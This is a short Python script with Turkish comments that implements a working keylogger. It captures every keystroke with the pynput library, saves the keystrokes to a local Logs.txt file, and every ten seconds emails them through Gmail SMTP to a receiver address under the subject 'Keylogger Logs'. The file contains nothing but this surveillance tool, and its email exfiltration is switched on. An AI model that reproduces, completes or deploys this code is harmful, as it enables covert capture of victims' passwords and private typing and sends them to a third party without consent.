from datetime import datetime
from pynput import keyboard
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Ayarlar
EMAIL_ADDRESS = "sender_mail"        # Gönderici mail
EMAIL_PASSWORD = "uygulama_şifresi"            # Gmail uygulama şifresi
TO_ADDRESS = "reciever_mail"             # Hedef mail

interval = 10  # saniye
TEST_MODE = False  # Test modunu devre dışı bırakmak için False yap

text = ""

def send():
    global text
    try:
        if text.strip() != "":
            timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")

            # 1. Yedek olarak Logs.txt dosyasına yaz
            with open("Logs.txt", "a", encoding="utf-8") as log_file:
                log_file.write(f"{timestamp}\n{text}\n\n")

            if TEST_MODE:
                print("[TEST MODE] Mail içeriği:", text)
            else:
                # 2. Mail gönder
                msg = MIMEMultipart()
                msg['From'] = EMAIL_ADDRESS
                msg['To'] = TO_ADDRESS
                msg['Subject'] = 'Keylogger Logs'
                msg.attach(MIMEText(f"{timestamp}\n{text}", 'plain'))

                with smtplib.SMTP('smtp.gmail.com', 587) as server:
                    server.starttls()
                    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                    server.send_message(msg)

                print("Mail sent:", timestamp, text)

            text = ""

        # Tekrar zamanlayıcı başlat
        timer = threading.Timer(interval, send)
        timer.start()

    except Exception as e:
        print("Error while sending email or saving log:", e)

def on_press(key):
    global text
    try:
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key in [keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
            pass
        elif key == keyboard.Key.backspace and len(text) > 0:
            text = text[:-1]
        elif key == keyboard.Key.esc:
            return False
        else:
            text += str(key).strip("'")
    except Exception as e:
        print("Key press error:", e)

# Başlat
with keyboard.Listener(on_press=on_press) as listener:
    send()
    listener.join()